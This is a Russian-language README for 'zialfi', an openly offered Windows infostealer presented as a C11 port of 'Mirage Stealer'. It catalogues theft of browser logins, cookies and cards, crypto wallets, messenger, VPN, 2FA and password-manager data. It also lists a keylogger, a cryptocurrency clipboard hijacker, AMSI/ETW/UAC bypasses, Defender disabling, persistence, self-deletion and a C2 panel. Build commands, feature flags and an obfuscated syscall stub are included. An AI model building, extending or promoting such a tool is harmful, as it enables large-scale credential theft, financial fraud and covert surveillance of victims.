# zialfi

> **C11 Stealer** — полный port Mirage (Zig) → C11  
> Indirect syscalls, PEB walk, hash resolution, App-Bound Encryption

---

## Характеристики

| Параметр | Значение |
|----------|----------|
| **Язык** | C11 (MinGW cross-compile) |
| **Платформа** | Windows x86_64 |
| **Размер** | 209 KB (stripped) |
| **Тесты** | 86 assertions, 7/8 suites pass |
| **Модули** | 51 C файл, 14 header, ~39K LOC |

---

## Возможности

### Сбор данных

| Модуль | Покрытие | Статус |
|--------|----------|--------|
| **Browsers** | 58 Chromium + 10 Gecko — logins, cookies, history, autofill, bookmarks, cards | ✅ |
| **Wallets** | 96 extension + 38 desktop кошельков | ✅ |
| **Messengers** | 14 мессенджеров (Discord, Telegram, Signal, Skype, Viber, WhatsApp, ICQ, Pidgin, Session, Tox, Element, Jabber, Outlook, MicroSIP) | ✅ |
| **Gaming** | Steam (registry + userdata + CS2), Minecraft (18 лончеров + TLauncher), Roblox | ✅ |
| **VPN** | 18 клиентов (NordVPN, WireGuard, OpenVPN, SurfShark, ExpressVPN, CyberGhost, PIA, Mullvad, Windscribe, TunnelBear, Hotspot Shield, VyprVPN, Hamachi, HideMyName, IPVanish, RadminVPN, SoftEther, ProtonVPN) | ✅ |
| **2FA** | 7+ authenticators (Google, Microsoft, Authy, Duo, OTP, FreeOTP, Aegis) | ✅ |
| **Password Managers** | 8 менеджеров (Bitwarden, 1Password, LastPass, NordPass, Dashlane, RoboForm, KeePassXC, Keeper) | ✅ |
| **System Info** | OS, CPU, RAM, IP, network | ✅ |
| **WiFi** | Пароли сохранённых сетей | ✅ |
| **Seed Phrases** | BIP39 wordlist scan | ✅ |
| **Clipper** | BTC/ETH/LTC address swap в буфере обмена | ✅ |

### Функционал

| Функция | Описание | Статус |
|---------|----------|--------|
| **Keylogger** | WH_KEYBOARD_LL hook, ring buffer, timestamp | ✅ |
| **Screenshot** | GDI BitBlt, BMP format | ✅ |
| **Clipboard** | CF_UNICODETEXT, UTF-16→UTF-8 | ✅ |
| **File Grabber** | Desktop/Documents/Downloads, 12 extensions, 10MB limit | ✅ |
| **Seed Phrase** | BIP39 wordlist (2048 слов), файловый scan | ✅ |
| **Clipper** | BTC (1/3/bc1), ETH (0x42), LTC (L/M/ltc1) | ✅ |

### Безопасность

| Модуль | Описание | Статус |
|--------|----------|--------|
| **Syscalls** | Indirect через NASM stubs (syscall;ret) | ✅ |
| **PEB Walk** | Module hash resolution, export resolve | ✅ |
| **AMSI Bypass** | Patch amsi.dll | ✅ |
| **ETW Bypass** | Patch ntdll!EtwEventWrite | ✅ |
| **UAC Bypass** | Fodhelper auto-elevation | ✅ |
| **PEB Hide** | Unlink from InLoadOrderModuleList | ✅ |
| **Defender Disable** | Registry-based | ✅ |
| **Anti-Analysis** | 15 checks (RAM, CPU, screen, VM, timing, debugger, mouse, geo, hosting IP) | ✅ |
| **Persistence** | Registry Run Key, Task Scheduler, Startup Folder, WMI | ✅ |
| **Self-Delete** | 3 уровня (NtSetInformationFile, MoveFileEx, batch loop) | ✅ |
| **Temp Wipe** | Очистка TMP/TEMP директорий | ✅ |

### Инфраструктура

| Компонент | Описание | Статус |
|-----------|----------|--------|
| **C2 Panel** | Go 1.25 + React + SQLite + JWT + WebSocket | ✅ |
| **SQLite Parser** | Кастомный (B-tree, varint, 0 зависимостей) | ✅ |
| **ChaCha20-Poly1305** | Шифрование архивов | ✅ |
| **AES-256-GCM** | Chrome/Firefox расшифровка | ✅ |
| **DPAPI** | Windows Data Protection API | ✅ |
| **SChannel TLS** | HTTPS через Windows SChannel | ✅ |

---

## Сборка

### Требования

- MinGW-w64 (x86_64-w64-mingw32-gcc)
- NASM (assembler)
- GNU Make

### Команды

```bash
make            # Собрать mirage.exe (209 KB)
make clean      # Очистить
make test-unit  # 86 unit tests
```

### Конфигурация

Все модули управляются через `include/config.h`:

```c
#define ENABLE_CHROMIUM_STEALER    // 58 Chromium браузеров
#define ENABLE_FIREFOX_STEALER     // 10 Gecko браузеров
#define ENABLE_KEYLOGGER           // WH_KEYBOARD_LL hook
#define ENABLE_SCREENSHOT          // GDI BitBlt
#define ENABLE_CLIPBOARD           // CF_UNICODETEXT
#define ENABLE_FILE_GRABBER        // Desktop/Documents/Downloads
#define ENABLE_SEED_PHRASE_GRABBER // BIP39 scan
#define ENABLE_CLIPPER             // BTC/ETH/LTC swap
#define ENABLE_GAMING_STEAM        // Steam config + userdata
#define ENABLE_GAMING_MINECRAFT    // 18 лончеров
#define ENABLE_GAMING_ROBLOX       // Roblox data
// + 18 VPN, 7 2FA, 8 PM, 9 Evasion, 3 Cleanup
```

Комментируй флаги → отключение модуля → меньше бинарник.

---

## Структура проекта

```
zialfi/
├── include/
│   ├── config.h              Feature flags + crypto constants
│   ├── engine.h              Indirect syscall wrappers
│   ├── chromium.h            Browser stealer API
│   ├── firefox.h             Gecko stealer API
│   ├── appbound.h            Chrome App-Bound Encryption
│   └── ...                   Другие заголовки
├── src/
│   ├── main.c                Entry point + pipeline
│   ├── types/                PEB walk, hash, export resolve
│   ├── syscalls/             Indirect syscall engine (WinAPI fallback)
│   ├── asm/                  NASM stubs (hardcoded syscall;ret)
│   ├── browsers/             Chromium + Firefox stealer
│   ├── crypto/               AES-GCM, ChaCha20, DPAPI, App-Bound, base64
│   ├── evasion/              AMSI/ETW/UAC/PEB/Defender bypass, anti-analysis
│   ├── network/              HTTP upload, TLS, SOCKS5, proxy
│   ├── system/               Keylogger, screenshot, clipboard, grabber, clipper
│   ├── wallets/              134 crypto wallets
│   ├── messengers/           14 messengers
│   ├── cleanup/              Persistence, self-delete, temp wipe
│   ├── parsers/              Custom SQLite (B-tree, varint)
│   └── utils/                file_utils, base64
├── asm/
│   └── mirage_stubs_v2.asm   Hardcoded syscall;ret stubs
├── tests/                    86 unit tests (Linux native)
├── panel/                    Go + React C2 panel (port from Mirage)
└── Makefile                  Build system
```

---

## Syscalls — Indirect

```
NASM stub:
    mov r10, rcx          ; Windows ABI: rcx → r10
    mov eax, [ssn_X]     ; Load SSN
    xor eax, 0xA3B5C7D9  ; Deobfuscate
    syscall               ; Kernel call
    ret
```

- 30 Nt* wrappers с WinAPI fallback
- SSN resolution через PEB walk + hash
- Gadget pool из ntdll .text (fallback)

---

## Тесты

| Suite | Кол-во | Что проверяет |
|-------|--------|---------------|
| test_crypto | 9 | ChaCha20-Poly1305 roundtrip, tag verification |
| test_peb | 8 | PEB walk, module hash, XOR encrypt |
| test_chromium | 10 | 58 Chromium + 10 Gecko browser enumeration |
| test_wallets | 9 | 96 ext + 38 desktop wallet paths |
| test_messengers | 10 | 14 messenger path patterns |
| test_network | 8 | HTTP multipart, metadata, response parsing |
| test_evasion | 27 | Anti-analysis weighted scoring (15 checks) |
| test_sqlite | 5 | Custom SQLite parser |
| **Итого** | **86** | |

---

## Известные ограничения

| Проблема | Причина | Решение |
|----------|---------|---------|
| Chrome 7/11 паролей не расшифрованы | App-Bound Encryption (COM IElevator не зарегистрирован) | Запускать с GUI Chrome или NCrypt fallback |
| Keylogger не работает через SSH | Требует GUI event loop | Запускать интерактивно |
| SQLite test падает | Regressed из-за sed cleanup | Исправить в следующем релизе |

---

## Credits

- **Оригинал**: [Mirage Stealer](https://github.com/) — Zig 0.16, 24K LOC
- **Panel**: Go 1.25 + React + Vite + SQLite
- **Port**: C11 + MinGW + NASM, ~39K LOC
